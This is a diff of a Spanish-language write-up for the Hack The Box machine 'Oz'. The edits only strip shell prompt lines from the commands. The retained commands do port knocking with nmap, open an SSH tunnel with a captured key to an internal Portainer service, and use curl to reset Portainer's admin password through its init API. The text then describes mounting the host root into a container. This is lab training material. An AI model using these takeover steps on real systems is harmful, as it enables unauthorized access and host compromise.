@@ -415,15 +415,13 @@ PORT     STATE SERVICE
 ```
 Procedemos a hacer un Local Port Forwarding al conectarnos a la maquina del puerto 9000 para verlo en nuestro localhost:9000:
 ```bash
-──(root💀pro)-[/home/…/Escritorio/HTB/Oz/nmap]
-└─# for port in 40809 50212 46969; do nmap -sU -Pn --max-retries 0 -p$port 10.10.10.96; done &> /dev/null; ssh -i id_rsa dorthi@10.10.10.96 -L 9000:172.17.0.2:9000                                       255 ⨯ 1 ⚙
+# for port in 40809 50212 46969; do nmap -sU -Pn --max-retries 0 -p$port 10.10.10.96; done &> /dev/null; ssh -i id_rsa dorthi@10.10.10.96 -L 9000:172.17.0.2:9000                                       255 ⨯ 1 ⚙
 Enter passphrase for key 'id_rsa': 
 dorthi@Oz:~$
 ```
 Comprobamos que se ha hecho correctamente
 ```bash
-┌──(root💀pro)-[/home/pro]
-└─# lsof -i:9000                                                                                                   
+# lsof -i:9000                                                                                                   
 COMMAND   PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
 ssh     14080 root    4u  IPv6 107500      0t0  TCP localhost:9000 (LISTEN)
 ssh     14080 root    5u  IPv4 107501      0t0  TCP localhost:9000 (LISTEN)
@@ -437,8 +435,7 @@ Y ahora por aqui ya estariamos viendo el servicio de PORTAINER en nuestro 127.0.
 Buscamos credenciales por defecto y encontramos una forma de setear o resetear la contraseña del admin si no ha sido previamente cambiada.Probamos:
 
 ```bash                               
-┌──(root💀pro)-[/home/pro]
-└─# curl -s -X POST "http://127.0.0.1:9000/api/users/admin/init" --data  '{"Username": "admin", "Password": "pro"}'
+# curl -s -X POST "http://127.0.0.1:9000/api/users/admin/init" --data  '{"Username": "admin", "Password": "pro"}'
 ```
 Entramos a la aplicacion Portainer y vemos que podemos crear un contenedor asique seguimos con el concepto de montar la / raiz de la maquina en un contenedor alojado como una montura para poder cambiar los archivos de la maquina y que se retoquen en la misma maquina
 
